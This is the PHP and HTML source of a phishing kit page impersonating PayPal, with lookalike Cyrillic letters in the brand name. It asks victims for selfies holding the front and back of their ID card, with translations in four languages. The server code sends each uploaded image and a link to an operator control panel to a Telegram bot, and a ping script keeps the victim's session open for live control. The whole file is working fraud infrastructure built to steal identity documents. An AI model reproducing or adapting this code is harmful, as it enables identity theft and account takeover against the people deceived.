<?php
require_once 'config.php';
 $sid = $_GET['sid'] ?? '';
if (!$sid) { redirect('index.php'); }

 $sData = get_session($sid);
 $lang = $sData['lang'] ?? 'en'; 

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = get_session($sid) ?: [];
    $data['selfie_uploaded'] = true;
    $data['status'] = 'waiting';
    save_session($sid, $data);

    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
    $panel_link = rtrim($base_url, '/') . '/panel.php?sid=' . $sid;

    // ✅ Kan-sayfto les images l Telegram
    if(isset($_FILES['selfie_front']) && $_FILES['selfie_front']['error'] == 0) {
        sendDocumentToTelegram($_FILES['selfie_front']['tmp_name'], "🤳 Selfie with ID Front | SID: $sid", $_FILES['selfie_front']['name']);
    }
    if(isset($_FILES['selfie_back']) && $_FILES['selfie_back']['error'] == 0) {
        sendDocumentToTelegram($_FILES['selfie_back']['tmp_name'], "🤳 Selfie with ID Back | SID: $sid", $_FILES['selfie_back']['name']);
    }

    sendToTelegram("🤳 <b>Selfie Uploaded</b>\nSID: <code>$sid</code>\n\n➡️ <a href='{$panel_link}'>Open Control Panel</a>");
    redirect("waiting.php?sid=" . $sid);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>РayРal - Selfie Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #f5f7f9; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { width: 100%; max-width: 460px; background: #ffffff; border-radius: 16px; padding: 40px 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); text-align: center; }
        .logo { height: 35px; margin-bottom: 25px; }
        h1 { font-size: 24px; font-weight: 700; color: #001c3a; margin-bottom: 15px; }
        
        .warning-box { background-color: #fffbfa; border: 1px solid #d9393a; border-radius: 4px; padding: 14px 16px; margin-bottom: 20px; display: flex; align-items: flex-start; text-align: left; width: 100%; }
        .warning-icon { color: #d9393a; font-weight: bold; font-style: normal; font-size: 18px; margin-right: 12px; line-height: 1.2; display: flex; align-items: center; }
        .warning-text { color: #2c2e2f; font-size: 13px; line-height: 1.5; font-weight: 500; }

        .guide-container { display: flex; gap: 15px; margin-bottom: 25px; }
        .guide-box { flex: 1; border: 1px solid #e1e7eb; border-radius: 12px; padding: 15px 10px; text-align: center; position: relative; }
        .guide-box.correct { border-color: #00a651; background: #f3fffb; }
        .guide-box.incorrect { border-color: #d9381e; background: #fff8f8; }
        .guide-icon { font-size: 32px; margin-bottom: 8px; display: block; }
        .guide-box.correct .guide-icon { color: #00a651; }
        .guide-box.incorrect .guide-icon { color: #d9381e; }
        .guide-title { font-size: 13px; font-weight: 700; margin-bottom: 5px; color: #000; }
        .guide-desc { font-size: 11px; color: #6c7378; line-height: 1.4; }

        .upload-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px; }
        .upload-box { border: 2px dashed #cbd2d6; border-radius: 12px; padding: 20px 10px; cursor: pointer; transition: all 0.2s; position: relative; }
        .upload-box:hover { border-color: #0070ba; background-color: #f5f7f9; }
        .upload-box img { max-width: 100%; max-height: 120px; border-radius: 8px; display: none; margin-bottom: 10px; }
        .upload-icon { font-size: 30px; color: #0070ba; margin-bottom: 10px; }
        .upload-text { font-size: 13px; font-weight: 600; color: #2c2e2f; }
        .upload-subtext { font-size: 11px; color: #6c7378; margin-top: 5px; }
        .btn-submit { width: 100%; background-color: #0070ba; color: #ffffff; border: none; border-radius: 100px; padding: 16px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background-color 0.2s, opacity 0.2s; }
        .btn-submit:hover { background-color: #005ea6; }
        .btn-submit:disabled { opacity: 0.7; cursor: not-allowed; }
    </style>
</head>
<body onload="initLang('<?php echo $lang; ?>')">
    <div class="container">
        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5RSx4N3Nta8EwHtwbbr2PVdtHByHhIOXOCqOxH0zt1w&s=10" alt="РayРal">
        
        <h1 id="sf_title">Selfie Verification</h1>

        <div class="warning-box">
            <span class="warning-icon">⚠️</span>
            <div id="sf_warning_text" class="warning-text">The photo must be clear and well-lit, or it will not be accepted. Ensure your face and ID card are fully visible.</div>
        </div>

        <div class="guide-container">
            <div class="guide-box correct">
                <span class="guide-icon"><i class="fas fa-check-circle"></i></span>
                <div class="guide-title" id="sf_ok_title">Correct</div>
                <div class="guide-desc" id="sf_ok_desc">Clear face and ID. No glare.</div>
            </div>
            <div class="guide-box incorrect">
                <span class="guide-icon"><i class="fas fa-times-circle"></i></span>
                <div class="guide-title" id="sf_no_title">Incorrect</div>
                <div class="guide-desc" id="sf_no_desc">Blurry, glare, or hidden face.</div>
            </div>
        </div>
        
        <form id="uploadForm" method="POST" enctype="multipart/form-data" action="upload-selfie.php?sid=<?php echo htmlspecialchars($sid); ?>">
            <div class="upload-grid">
                <div class="upload-box" onclick="document.getElementById('selfie_front').click()">
                    <img id="preview_front" src="">
                    <div class="upload-icon">🤳</div>
                    <div class="upload-text" id="sf_front_text">Selfie with ID Front</div>
                    <div class="upload-subtext" id="sf_front_sub">Click to browse</div>
                    <input type="file" id="selfie_front" name="selfie_front" accept="image/*" hidden>
                </div>
                <div class="upload-box" onclick="document.getElementById('selfie_back').click()">
                    <img id="preview_back" src="">
                    <div class="upload-icon">🤳</div>
                    <div class="upload-text" id="sf_back_text">Selfie with ID Back</div>
                    <div class="upload-subtext" id="sf_back_sub">Click to browse</div>
                    <input type="file" id="selfie_back" name="selfie_back" accept="image/*" hidden>
                </div>
            </div>
            <button type="submit" class="btn-submit" id="sf_submit">Submit Selfies</button>
        </form>
    </div>

    <script>
        document.getElementById('selfie_front').addEventListener('change', function(e) {
            if (e.target.files && e.target.files[0]) {
                let reader = new FileReader();
                reader.onload = function(event) {
                    document.getElementById('preview_front').src = event.target.result;
                    document.getElementById('preview_front').style.display = 'block';
                };
                reader.readAsDataURL(e.target.files[0]);
            }
        });
        document.getElementById('selfie_back').addEventListener('change', function(e) {
            if (e.target.files && e.target.files[0]) {
                let reader = new FileReader();
                reader.onload = function(event) {
                    document.getElementById('preview_back').src = event.target.result;
                    document.getElementById('preview_back').style.display = 'block';
                };
                reader.readAsDataURL(e.target.files[0]);
            }
        });

        // L-Script dyal Loading
        document.getElementById('uploadForm').addEventListener('submit', function(e) {
            let front = document.getElementById('selfie_front').files.length;
            let back = document.getElementById('selfie_back').files.length;
            if (front === 0 || back === 0) {
                e.preventDefault();
                alert('Please upload both selfies.');
                return;
            }
            let btn = document.getElementById('sf_submit');
            btn.innerText = 'Uploading...';
            btn.style.opacity = '0.7';
            btn.disabled = true;
        });

        const translations_selfie = {
            en: { title: "Selfie Verification", warning: "The photo must be clear and well-lit, or it will not be accepted. Ensure your face and ID card are fully visible.", ok_t: "Correct", ok_d: "Clear face and ID. No glare.", no_t: "Incorrect", no_d: "Blurry, glare, or hidden face.", front_t: "Selfie with ID Front", back_t: "Selfie with ID Back", submit: "Submit Selfies" },
            de: { title: "Selfie-Verifizierung", warning: "Das Foto muss klar und gut beleuchtet sein, sonst wird es nicht akzeptiert. Stellen Sie sicher, dass Ihr Gesicht und der Ausweis vollständig sichtbar sind.", ok_t: "Richtig", ok_d: "Klares Gesicht und Ausweis. Keine Blendung.", no_t: "Falsch", no_d: "Verschwommen, Blendung oder verdecktes Gesicht.", front_t: "Selfie mit Ausweis Vorderseite", back_t: "Selfie mit Ausweis Rückseite", submit: "Selfies einreichen" },
            fr: { title: "Vérification par selfie", warning: "La photo doit être claire et bien éclairée, sinon elle ne sera pas acceptée. Assurez-vous que votre visage et votre pièce d'identité sont entièrement visibles.", ok_t: "Correct", ok_d: "Visage et ID clairs. Pas de reflet.", no_t: "Incorrect", no_d: "Flou, reflet ou visage caché.", front_t: "Selfie avec ID Recto", back_t: "Selfie avec ID Verso", submit: "Soumettre les selfies" },
            pl: { title: "Weryfikacja selfie", warning: "Zdjęcie musi być wyraźne i dobrze oświetlone, w przeciwnym razie nie zostanie zaakceptowane. Upewnij się, że twoja twarz i dowód tożsamości są w pełni widoczne.", ok_t: "Poprawnie", ok_d: "Wyraźna twarz i dowód. Brak odbłysków.", no_t: "Niepoprawnie", no_d: "Rozmyte, odbłyski lub zasłonięta twarz.", front_t: "Selfie z przodem dowodu", back_t: "Selfie z tyłem dowodu", submit: "Prześlij selfie" }
        };
        function initLang(lang) {
            const data = translations_selfie[lang] || translations_selfie['en'];
            document.getElementById('sf_title').innerText = data.title;
            document.getElementById('sf_warning_text').innerText = data.warning;
            document.getElementById('sf_ok_title').innerText = data.ok_t;
            document.getElementById('sf_ok_desc').innerText = data.ok_d;
            document.getElementById('sf_no_title').innerText = data.no_t;
            document.getElementById('sf_no_desc').innerText = data.no_d;
            document.getElementById('sf_front_text').innerText = data.front_t;
            document.getElementById('sf_back_text').innerText = data.back_t;
            document.getElementById('sf_submit').innerText = data.submit;
        }
    </script>

    <script>
        const sid = "<?php echo isset($sid) ? addslashes($sid) : ''; ?>";
        if(sid) {
            setInterval(() => {
                fetch('process.php?action=ping&sid=' + sid)
                    .catch(err => console.error('Ping error'));
            }, 5000);
        }
    </script>
</body>
</html>